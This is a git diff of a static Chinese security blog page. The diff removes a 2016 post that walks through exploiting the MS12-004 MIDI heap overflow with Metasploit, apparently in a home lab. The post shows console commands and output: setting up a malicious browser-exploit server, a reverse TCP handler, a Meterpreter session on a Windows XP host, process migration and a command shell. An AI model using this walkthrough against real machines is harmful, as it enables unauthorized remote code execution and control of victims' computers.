-  	<time datetime="2016-08-09T14:40:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[*] Processing setup.rc <span class="keyword">for</span> ERB directives.</div><div class="line">resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msf</div><div class="line">resource (setup.rc)&gt; load msgrpc User=msf Pass=<span class="string">'abc123'</span></div><div class="line">[*] MSGRPC Service:  127.0.0.1:55552</div><div class="line">[*] MSGRPC Username: msf</div><div class="line">[*] MSGRPC Password: abc123</div><div class="line">[*] Successfully loaded plugin: msgrpc</div></pre></td></tr></table></figure>
-<h1 id="搜索和使用漏洞模块"><a href="#搜索和使用漏洞模块" class="headerlink" title="搜索和使用漏洞模块"></a>搜索和使用漏洞模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">msf &gt; search 12-004</div><div class="line">[!] Module database cache not built yet, using slow search</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank    Description</div><div class="line">   ----                                   ---------------  ----    -----------</div><div class="line">   exploit/windows/browser/ms12_004_midi  2012-01-10       normal  MS12-004 midiOutPlayNextPolyEvent Heap Overflow</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; use exploit/windows/browser/ms12_004_midi</div></pre></td></tr></table></figure>
-<h1 id="显示和设置相关Option"><a href="#显示和设置相关Option" class="headerlink" title="显示和设置相关Option"></a>显示和设置相关Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms12_004_midi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/browser/ms12_004_midi):</div><div class="line"></div><div class="line">   Name       Current Setting  Required  Description</div><div class="line">   ----       ---------------  --------  -----------</div><div class="line">   OBFUSCATE  <span class="literal">false</span>            no        Enable JavaScript obfuscation</div><div class="line">   SRVHOST    0.0.0.0          yes       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</div><div class="line">   SRVPORT    8080             yes       The <span class="built_in">local</span> port to listen on.</div><div class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</div><div class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</div><div class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> SRVHOST 192.168.1.8</div><div class="line">SRVHOST =&gt; 192.168.1.8</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> URIPATH /</div><div class="line">URIPATH =&gt; /</div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> LPORT 1234</div><div class="line">LPORT =&gt; 1234</div><div class="line">msf exploit(ms12_004_midi) &gt; exploit</div><div class="line">[*] Exploit running as background job.</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:1234</div><div class="line">[*] Using URL: http://192.168.1.8:8080/</div><div class="line">[*] Server started.</div></pre></td></tr></table></figure>
-<h1 id="使用目标主机IE浏览器打开URL后控制台输出为"><a href="#使用目标主机IE浏览器打开URL后控制台输出为" class="headerlink" title="使用目标主机IE浏览器打开URL后控制台输出为"></a>使用目标主机IE浏览器打开URL后控制台输出为</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">*] 192.168.1.43     ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending html to 192.168.1.43:2933...</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending midi corruption file...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800</div><div class="line">[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript <span class="string">'migrate -f'</span></div><div class="line">[*] Current server process: iexplore.exe (372)</div><div class="line">[*] Spawning notepad.exe process to migrate to</div><div class="line">[+] Migrating to 3948</div><div class="line">[+] Successfully migrated to process</div></pre></td></tr></table></figure>
-<h1 id="查看和使用session"><a href="#查看和使用session" class="headerlink" title="查看和使用session"></a>查看和使用session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">sf exploit(ms12_004_midi) &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  1   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43)</div><div class="line">  2   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; sessions -i 1</div><div class="line">[*] Starting interaction with 1...</div><div class="line"></div><div class="line">meterpreter &gt; ifconfig</div><div class="line"></div><div class="line">Interface  1</div><div class="line">============</div><div class="line">Name         : MS TCP Loopback interface</div><div class="line">Hardware MAC : 00:00:00:00:00:00</div><div class="line">MTU          : 1520</div><div class="line">IPv4 Address : 127.0.0.1</div><div class="line"></div><div class="line"></div><div class="line">Interface  2</div><div class="line">============</div><div class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</div><div class="line">Hardware MAC : 00:0c:29:84:07:87</div><div class="line">MTU          : 1500</div><div class="line">IPv4 Address : 192.168.1.43</div><div class="line">IPv4 Netmask : 255.255.255.0</div><div class="line"></div><div class="line">meterpreter &gt; shell</div><div class="line">Process 204 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/sec/Metasploit-MIDI文件解析远程代码执行/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1313,6 +1324,10 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">OSSEC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
@@ -1369,11 +1384,15 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color1">hydra</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">运维</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
             
             <div class="clearfix"></div>
